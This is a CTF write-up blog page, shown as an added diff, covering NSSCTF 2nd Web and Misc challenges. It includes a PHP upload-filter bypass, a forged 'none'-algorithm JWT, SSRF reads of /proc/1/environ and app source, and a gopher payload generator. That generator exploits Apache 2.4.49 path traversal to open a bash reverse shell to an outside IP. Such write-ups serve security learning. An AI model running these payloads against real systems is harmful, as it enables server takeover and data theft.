@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      NSSCTF 2nd WP 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">NSSCTF 2nd WP</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-08-28 12:31:40
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="php签到"><a href="#php签到" class="headerlink" title="php签到"></a>php签到</h4><p>&#x2F;. 绕过pathinfo判断，直接上传php文件，注意要url加密一下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://node6.anna.nssctf.cn:28990/"</span>
+result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">"%31%2e%70%68%70%2f%2e"</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h4 id="2周年快乐"><a href="#2周年快乐" class="headerlink" title="2周年快乐"></a>2周年快乐</h4><p>SB题目，测了半天导致我失去了第三题的前三血<br>D盘有提示 curl me   flag在<a target="_blank" rel="noopener" href="http://www.nssctf.cn/flag">www.nssctf.cn/flag</a><br>然后要我几把用终端去curl <a target="_blank" rel="noopener" href="https://www.nssctf.cn/flag">https://www.nssctf.cn/flag</a><br>单纯用curl会报错不存在，出题人牛魔酬宾	</p>
+<h4 id="MyJs"><a href="#MyJs" class="headerlink" title="MyJs"></a>MyJs</h4><p>注册获取token</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiJBZWNvdXMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY5MzE0NjA3Nn0.3Wq4mpm2exS2mgqcIfHulC-unWSsBpJ7nPvhR8X_-fU<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>jwt.io解密<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693146427587-d79fa332-744c-483c-b6dc-40fe6d906736.png#averageHue=%23fdfdfd&clientId=uc926241d-7ffa-4&from=paste&height=565&id=u3046abe0&originHeight=848&originWidth=1815&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=96512&status=done&style=none&taskId=ue6ef5995-7e19-43f0-a64c-ceeaf95e682&title=&width=1210" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693146260027-d70e78a1-103e-47c5-adbe-b3490fe45bc3.png#averageHue=%233f443f&clientId=uc926241d-7ffa-4&from=paste&height=157&id=uab2b60eb&originHeight=235&originWidth=1266&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=138882&status=done&style=none&taskId=u216f4d4e-1846-4d12-b335-9332a0ad2b8&title=&width=844" alt="image.png"><br>sid为token中的secretid，直接取数组让其报错为undefined，jwt空算法攻击导致可伪造</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">secretid</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'nss'</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
+  <span class="token string-property property">"iat"</span><span class="token operator">:</span><span class="token number">1693146076</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>user<span class="token punctuation">.</span>secretid<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'none'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0<span class="token punctuation">.</span>eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoibnNzIiwicGFzc3dvcmQiOiIxIiwiaWF0IjoxNjkzMTQ2MDc2fQ<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>直接登录更新session，访问update路由触发原型链污染，观察可见源码中存在ejs模板渲染等，猜测可能存在ejs原型链污染rce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693146683287-567bd507-3a87-43fd-a50d-2cda06ebbbf8.png#averageHue=%235e725a&clientId=uc926241d-7ffa-4&from=paste&height=427&id=ua0db6f35&originHeight=640&originWidth=973&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=302320&status=done&style=none&taskId=u7a06e3e1-4f23-45bc-8d30-766975a915e&title=&width=648.6666666666666" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693146751622-f73f4f02-4d41-4859-b0b0-ac63ede8d02e.png#averageHue=%23fdfcfc&clientId=uc926241d-7ffa-4&from=paste&height=762&id=u94030016&originHeight=1143&originWidth=1506&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=115100&status=done&style=none&taskId=u0340726e-f1d8-40c2-9afe-f7a01df25fa&title=&width=1004" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693146737576-ce77f0b7-10e2-4534-a17d-d4b40dc4b36c.png#averageHue=%23333130&clientId=uc926241d-7ffa-4&from=paste&height=131&id=u6e9e37c0&originHeight=197&originWidth=1047&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22472&status=done&style=none&taskId=ufe90e357-5ff1-4643-9eae-7c672c077ef&title=&width=698" alt="image.png"><br>env<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693146773417-1822906f-c0bc-4594-b96d-8d286e085ee3.png#averageHue=%230d0c0b&clientId=uc926241d-7ffa-4&from=paste&height=335&id=u71c789b5&originHeight=503&originWidth=1425&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48393&status=done&style=none&taskId=u9bdde467-f3a2-4016-b2b8-97a4d570891&title=&width=950" alt="image.png"></p>
+<h4 id="Mybox"><a href="#Mybox" class="headerlink" title="Mybox"></a>Mybox</h4><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ
+结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<h4 id="MyBox-revenge"><a href="#MyBox-revenge" class="headerlink" title="MyBox(revenge)"></a>MyBox(revenge)</h4><p>file:&#x2F;&#x2F;&#x2F;app&#x2F;app.py读的源码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693138964668-1e06cbcd-25c3-4d9f-af8a-b2d05762af4f.png#averageHue=%23322b2a&clientId=u5a6cf786-fca2-4&from=paste&height=269&id=u31075d32&originHeight=269&originWidth=622&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37378&status=done&style=none&taskId=ua98ddbd8-46f1-469f-b99a-229224da3c4&title=&width=622" alt="image.png"><br>明显一个SSRF的利用点，mybox替代了gopher协议<br>掏个不知道啥时候收集的ssrfpoc生成脚本，发个包看看内网80端口的信息</p>
+<pre class="line-numbers language-none"><code class="language-none">mybox:&#x2F;&#x2F;127.0.0.1:80&#x2F;_GET%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl&#x2F;7.43.0%250D%250AAccept%253A%2520%252A&#x2F;%252A%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%25200%250D%250A%250D%250A%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693139865614-297d403a-6743-4c06-9505-790d28bb8a4c.png#averageHue=%23f1f0ef&clientId=udafe66ab-1a67-4&from=paste&height=617&id=ua5c54451&originHeight=617&originWidth=2184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167609&status=done&style=none&taskId=u4e36ebbf-1d92-4894-842a-a60045341f7&title=&width=2184" alt="image.png"><br>2.4.49，很明显的漏洞版本，在生成poc直接反弹shell即可</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+
+<span class="token keyword">def</span> <span class="token function">PAR_POST</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> content<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1:80'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    PAR <span class="token operator">=</span><span class="token string">"POST /&#123;&#125; HTTP/1.1\n"</span> \
+    <span class="token string">"Host: &#123;&#125;\n"</span> \
+    <span class="token string">"User-Agent: curl/7.43.0\n"</span> \
+    <span class="token string">"Accept: */*\n"</span> \
+    <span class="token string">"Content-Type: application/x-www-form-urlencoded\n"</span> \
+    <span class="token string">"Content-Length: &#123;&#125;\n\n"</span> \
+    <span class="token string">"&#123;&#125;\n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> host<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>PAR<span class="token punctuation">)</span>
+
+    NEW_PAR <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>PAR<span class="token punctuation">)</span>
+    NEW_PAR <span class="token operator">=</span> NEW_PAR<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
+    res <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/_'</span> <span class="token operator">+</span> NEW_PAR
+    <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+
+
+a<span class="token operator">=</span>PAR_POST<span class="token punctuation">(</span><span class="token string">"cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"echo;bash -c 'bash -i >&amp; /dev/tcp/43.137.36.145/3333 0>&amp;1'"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693139814120-276461c8-ea30-4cf9-b7f5-4854a126c64c.png#averageHue=%235c5b5b&clientId=udafe66ab-1a67-4&from=paste&height=975&id=uc2373573&originHeight=975&originWidth=1253&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99250&status=done&style=none&taskId=u2205a91b-40ea-4504-b989-7c40dec126d&title=&width=1253" alt="image.png"><br>这题有点问题的是，ssrf打内网80端口有时候会报错，不太清楚什么情况，不过和上一题基本一样的环境，所以就直接打了</p>
+<h4 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h4><p>一个tornado ssti，很少见啊,看源码waf ban了很多 () or and ‘ “ 大括号等<br>这群B太能卷了，给我顶下去了，那我只能半夜起来看看题了，拷打chatgpt+试验，然后就几把拿下了，不过感觉是非预期，我决定把这题留到早上7点交，我要sleep了<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693154710636-6b7c575b-6fef-4c08-a5fc-1e59a2c0b927.png#averageHue=%23c6ebc5&clientId=uc926241d-7ffa-4&from=paste&height=358&id=ufeb8b090&originHeight=358&originWidth=1927&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=62484&status=done&style=none&taskId=u87ddc401-e976-45fe-844d-7864a25aefd&title=&width=1927" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693154751597-cf0e80de-5f11-4df2-942d-8f5005b7333a.png#averageHue=%23fcfbfb&clientId=uc926241d-7ffa-4&from=paste&height=1189&id=u72cb6c5e&originHeight=1189&originWidth=1482&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=165733&status=done&style=none&taskId=ub59360f8-6397-4aa4-aaea-cbe4daf4402&title=&width=1482" alt="image.png"></p>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h4><p>启动会删flag，拷打一下gpt<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693127136989-1437bb78-ab01-4f0c-a9b3-5aa35d6c2799.png#averageHue=%23eff1f2&clientId=ubaac605d-3b14-4&from=paste&height=227&id=u20ba954f&originHeight=340&originWidth=1771&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=64542&status=done&style=none&taskId=u1e6ce026-dcaf-4f02-aca1-353bc6d5039&title=&width=1180.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693127153775-9e9ac024-9162-4ef1-abd2-d6087835d2c3.png#averageHue=%23f3f4f7&clientId=ubaac605d-3b14-4&from=paste&height=350&id=u3c83cd4e&originHeight=525&originWidth=884&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=41170&status=done&style=none&taskId=ue1594f71-9719-454c-82ae-03848bbfe8b&title=&width=589.3333333333334" alt="image.png"></p>
+<h4 id="gift-in-qrcode"><a href="#gift-in-qrcode" class="headerlink" title="gift_in_qrcode"></a>gift_in_qrcode</h4><p>反正就是连上去自己就会把数字丢出来，输入一下就给flag了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1693127364367-b8a47b06-15f9-4844-b5c3-cdf7aa828688.png#averageHue=%23320f2b&clientId=ubaac605d-3b14-4&from=paste&height=187&id=u9f5aca98&originHeight=280&originWidth=549&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=104136&status=done&style=none&taskId=u26b9812e-86b9-4a23-92d9-75693903f98&title=&width=366" alt="image.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/08/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-phar%E7%AF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-08-28 12:31:40
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%AD%BE%E5%88%B0"><span class="toc-text">php签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E5%91%A8%E5%B9%B4%E5%BF%AB%E4%B9%90"><span class="toc-text">2周年快乐</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MyJs"><span class="toc-text">MyJs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mybox"><span class="toc-text">Mybox</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MyBox-revenge"><span class="toc-text">MyBox(revenge)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MyHurricane"><span class="toc-text">MyHurricane</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Magic-Docker"><span class="toc-text">Magic Docker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gift-in-qrcode"><span class="toc-text">gift_in_qrcode</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + NSSCTF%202nd%20WP + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F08%2F28%2FNSSCTF-2nd-WP%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/08/28/NSSCTF-2nd-WP/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
